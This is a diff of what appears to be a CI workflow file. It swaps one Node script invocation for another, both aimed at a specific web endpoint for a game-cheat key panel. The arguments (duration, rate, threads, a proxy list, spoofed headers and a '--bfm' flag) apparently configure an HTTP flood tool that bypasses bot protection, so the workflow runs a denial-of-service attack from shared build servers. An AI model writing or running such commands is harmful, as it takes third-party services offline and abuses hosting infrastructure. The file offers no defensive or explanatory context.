@@ -37,7 +37,7 @@ jobs:
           unzip Fc-main.zip 
           
           cd Fc-main
-          node a.js POST https://tgclan.vippanel.store/connect  3000 4 1 proxy.txt  --postdata "game=PUBG&user_key=bshs&serial=9090be3c-7ca7-3531-a3f5-93a36398bbdc" --header "Content-Type:application/x-www-form-urlencoded#User-Agent:Mozilla/5.0" --debug --bfm
+          node y.js POST https://tgclan.vippanel.store/connect  3000 4 4  --postdata "game=PUBG&user_key=bshs&serial=9090be3c-7ca7-3531-a3f5-93a36398bbdc" --header "Content-Type:application/x-www-form-urlencoded#User-Agent:Mozilla/5.0" --debug --bfm
           
 
           
